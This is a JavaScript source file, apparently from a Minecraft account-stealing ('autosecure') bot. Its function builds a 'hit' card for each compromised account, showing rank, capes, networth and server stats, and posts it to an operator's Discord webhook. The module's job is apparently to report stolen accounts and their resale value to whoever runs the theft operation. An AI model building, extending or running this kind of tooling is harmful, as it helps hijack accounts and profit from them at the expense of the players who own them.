const { AttachmentBuilder, WebhookClient } = require('discord.js');
const { makeCard } = require('../drawhit');
const config = require('../../../configLoader');
const path = require('path');
const fs = require('fs');
const { startFolderMonitor } = require('../autocleaner');

const { queryParams } = require('../../../db/database');

function isValidMinecraftUsername(name) {
    if (!name || typeof name !== 'string') return false;
    const invalidKeywords = ["couldn't find!", "couldn't change!", "no minecraft!", "xbl failed", "none", "unknown", "failed"];
    if (invalidKeywords.includes(name.trim().toLowerCase())) return false;
    return /^[a-zA-Z0-9_]{2,16}$/.test(name.trim());
}

const recentNotifications = new Set();

async function sendSecureNotification(client, accountData, targetChannelId = null) {
    try {
        if (!accountData?.username || !isValidMinecraftUsername(accountData.username)) {
            console.log(`[NOTIFIER] Skipping notification for invalid/placeholder username: '${accountData?.username}'`);
            return;
        }

        // Strict deduplication: 1 hit = 1 notification within 30s window
        const notifKey = `${accountData.username.toLowerCase()}_${Math.floor(Date.now() / 30000)}`;
        if (recentNotifications.has(notifKey)) {
            console.log(`[NOTIFIER] Skipping duplicate notification for ${accountData.username}`);
            return;
        }
        recentNotifications.add(notifKey);
        setTimeout(() => recentNotifications.delete(notifKey), 60000);

        let customWebhook = null;

        if (client?.username) {
            try {
                const dbResults = await queryParams('SELECT webhook FROM autosecure WHERE user_id = ? AND botnumber = ? LIMIT 1', [client.username, client.botnumber || 1]);
                if (dbResults && dbResults[0]?.webhook) {
                    customWebhook = dbResults[0].webhook;
                }
            } catch (e) {
                console.error('[NOTIFIER] Error checking DB for webhook:', e.message);
            }
        }

        // Priority: custom user webhook -> fallback to global config.notifierWebhook (1 channel = 1 webhook only)
        const targetWebhook = (customWebhook && customWebhook.trim() !== '')
            ? customWebhook.trim()
            : (config.notifierWebhook && config.notifierWebhook.trim() !== '' ? config.notifierWebhook.trim() : null);

        if (!targetWebhook) {
            console.log('[NOTIFIER] No webhook configured (customWebhook or config.notifierWebhook), skipping draw hit.');
            return;
        }

        const stats = {
            username: accountData.username || 'Unknown',
            capes: accountData.capes || [],
            rank: accountData.rank || 'NONE',
            networth: accountData.networth || '0',
            bedwars: accountData.bedwars || accountData.bedwarsLevel || '0',
            networkLevel: accountData.networkLevel || '0',
            sbLevel: accountData.sbLevel || '0',
            skywarsLevel: accountData.skywarsLevel || '0',
            duelKDR: accountData.duelKDR || '0',
            duelWinstreak: accountData.duelWinstreak || '0',
            plusColour: accountData.plusColour || 'None',
            gifted: accountData.gifted || '0',
            donut: accountData.donut || null,
            donutMoney: accountData.donutMoney || accountData.donut?.moneyFormatted || accountData.donut?.money || null,
            donutShards: accountData.donutShards || accountData.donut?.shardsFormatted || accountData.donut?.shards || null,
            donutPlaytime: accountData.donutPlaytime || accountData.donut?.playtime || null,
            donutRank: accountData.donutRank || accountData.donut?.rank || null,
            donutKDR: accountData.donutKDR || accountData.donut?.kdr || null
        };

        const timestamp = Date.now();
        const obscureFilename = accountData.username && accountData.username.length > 3
            ? accountData.username.substring(0, 2) + "x".repeat(accountData.username.length - 2)
            : "hit";
        const filename = `hit_${obscureFilename}_${timestamp}.png`;
        const tempDir = path.join(__dirname, 'temp');

        if (!fs.existsSync(tempDir)) {
            fs.mkdirSync(tempDir, { recursive: true });
            startFolderMonitor(tempDir, 5);
        }

        const outputPath = path.join(tempDir, filename);
        const imageBuffer = await makeCard(stats, outputPath);

        if (!imageBuffer) {
            console.error(`[NOTIFIER] Failed to generate hit card buffer for ${stats.username}`);
            return;
        }

        const attachment = new AttachmentBuilder(imageBuffer, { name: filename });

        // Draw hit strictly sends ONLY the image to 1 channel via webhook (1 hit = 1 webhook)
        try {
            const webhook = new WebhookClient({ url: targetWebhook });
            await webhook.send({
                files: [attachment]
            });
            console.log(`[NOTIFIER] Successfully sent hit card image to webhook (${targetWebhook.substring(0, 45)}...) for ${stats.username}`);
        } catch (whErr) {
            console.error('[NOTIFIER] Error sending hit image to webhook:', whErr.message);
        } finally {
            if (fs.existsSync(outputPath)) {
                fs.unlink(outputPath, () => {});
            }
        }

    } catch (error) {
        console.error('[NOTIFIER] Failed to send secure notification:', error);
    }
}

module.exports = { sendSecureNotification };
